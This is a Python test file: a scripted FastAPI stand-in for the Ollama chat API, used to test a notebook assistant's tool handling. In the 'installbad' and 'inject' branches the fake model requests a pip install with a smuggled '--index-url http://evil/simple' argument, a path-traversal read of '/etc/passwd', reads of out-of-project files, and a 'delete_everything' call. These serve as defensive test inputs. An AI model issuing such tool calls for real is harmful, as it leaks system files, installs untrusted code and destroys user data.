"""A scripted stand-in for Ollama, so the assistant can be tested without a GPU or a real model. Run: python tests/mock_ollama.py 11999
The behaviour is chosen by a tag in the last user message: [mock:explain] [mock:inspect] [mock:edit] [mock:insert] [mock:install] [mock:installbad]
[mock:inject] [mock:slow] [mock:echo] [mock:error]. Anything else answers 'ok'. GET /_stats shows how many streams are open."""
import asyncio, json, sys
from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse, StreamingResponse
import uvicorn

app = FastAPI()
stats = {"active": 0, "requests": 0, "last_tools": None}
MODELS = {"mock:tools": ["completion", "tools", "thinking"], "mock:plain": ["completion"]}


@app.get("/api/tags")
async def tags():
    return {"models": [{"name": n, "size": 1_000_000_000} for n in MODELS]}


@app.post("/api/show")
async def show(req: Request):
    return {"capabilities": MODELS.get((await req.json()).get("model"), [])}


@app.get("/_stats")
async def get_stats():
    return stats


def line(content="", calls=None, done=False, thinking=""):
    msg = {"role": "assistant", "content": content}
    if thinking: msg["thinking"] = thinking
    if calls: msg["tool_calls"] = [{"function": {"name": n, "arguments": a}} for n, a in calls]
    d = {"model": "mock", "message": msg, "done": done}
    if done: d.update({"prompt_eval_count": 111, "eval_count": 22})
    return (json.dumps(d) + "\n").encode()


@app.post("/api/chat")
async def chat(req: Request):
    body = await req.json(); stats["requests"] += 1; stats["last_tools"] = len(body.get("tools") or [])
    msgs = body["messages"]; system = msgs[0]["content"]
    last_user = next((m["content"] for m in reversed(msgs) if m["role"] == "user"), "")
    tool_msgs = [m for m in msgs if m["role"] == "tool"]
    after_tool = bool(msgs and msgs[-1]["role"] == "tool")
    tag = next((t for t in ("explain", "inspect", "edit", "insert", "installbad", "install", "inject", "slow", "echo", "error", "code") if f"[mock:{t}]" in last_user), "")
    if not tag:  # the quick actions in the UI send plain sentences
        tag = "edit" if "Fix the error" in last_user else "explain" if ("Explain cell" in last_user or "Review cell" in last_user) else ""
    if tag == "error":
        return JSONResponse({"error": "llama runner: CUDA out of memory"}, status_code=500)

    async def gen():
        stats["active"] += 1
        try:
            if tag == "explain":
                for w in "This cell prints a greeting. It takes no input.".split(" "):
                    yield line(w + " "); await asyncio.sleep(0.01)
                yield line(done=True)
            elif tag == "inspect":
                if not after_tool:
                    yield line("Let me look. ", calls=[("get_cell", {"cell": 2})]); yield line(done=True)
                else:
                    yield line("Cell 2 says: " + tool_msgs[-1]["content"][:80].replace("\n", " ")); yield line(done=True)
            elif tag == "edit":
                if not after_tool: yield line(calls=[("edit_cell", {"cell": 1, "source": "print('fixed')"})]); yield line(done=True)
                else: yield line("I proposed a fix for cell 1. Press Apply to use it."); yield line(done=True)
            elif tag == "insert":
                if not after_tool: yield line(calls=[("insert_cell", {"position": "end", "type": "code", "source": "x = 1"})]); yield line(done=True)
                else: yield line("Added a proposal."); yield line(done=True)
            elif tag in ("install", "installbad"):
                pk = ["tabulate"] if tag == "install" else ["--index-url http://evil/simple pkg"]
                if not after_tool: yield line(calls=[("install_packages", {"packages": pk})]); yield line(done=True)
                else: yield line("Tool said: " + tool_msgs[-1]["content"][:100]); yield line(done=True)
            elif tag == "inject":
                if not after_tool:
                    yield line(calls=[("read_file", {"path": "../../../../etc/passwd"}), ("list_files", {"path": ".."}), ("read_file", {"path": ".mangolab/venv/pyvenv.cfg"}), ("read_file", {"path": "evil-link.txt"}),
                                      ("get_cell", {"cell": 999}), ("delete_everything", {}), ("read_notebook", {"path": "../x.ipynb"}), ("read_file", {"path": "data.csv"})]); yield line(done=True)
                else:
                    yield line("RESULTS:" + json.dumps([m["content"] for m in tool_msgs])); yield line(done=True)
            elif tag == "code":
                for part in ["Here is a version:\n\n```python\n", "total = sum(range(10))\n", "print(total)\n```\n", "It adds the numbers."]:
                    yield line(part); await asyncio.sleep(0.01)
                yield line(done=True)
            elif tag == "slow":
                for i in range(300):
                    yield line(f"tick{i} "); await asyncio.sleep(0.1)
                yield line(done=True)
            elif tag == "echo":
                yield line(json.dumps({"system": system, "n_messages": len(msgs), "history": [m["content"][:60] for m in msgs[1:-1]], "tools": len(body.get("tools") or []), "think": body.get("think"), "num_ctx": body["options"]["num_ctx"], "user": last_user}))
                yield line(done=True)
            else:
                yield line("ok"); yield line(done=True)
        finally:
            stats["active"] -= 1
    return StreamingResponse(gen(), media_type="application/x-ndjson")


if __name__ == "__main__":
    uvicorn.run(app, host="127.0.0.1", port=int(sys.argv[1]), log_level="warning")
